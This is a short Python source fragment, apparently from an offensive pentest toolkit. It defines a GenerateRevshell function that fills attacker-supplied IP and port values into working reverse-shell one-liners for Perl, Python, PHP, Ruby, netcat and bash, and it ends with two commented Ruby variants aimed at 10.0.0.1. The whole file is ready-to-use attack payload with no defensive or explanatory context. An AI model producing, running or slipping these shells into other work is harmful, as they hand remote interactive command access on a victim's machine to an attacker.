def GenerateRevshell(ip, port):
    return {"perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    "php": f'php -r \'$sock=fsockopen("{ip}", {port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "ruby": f'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}\'',
    "netcat": f'nc -e /bin/sh {ip} {port}',
    "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"}

# ruby -rsocket -e\'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'
# ruby -rsocket -e\'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}\'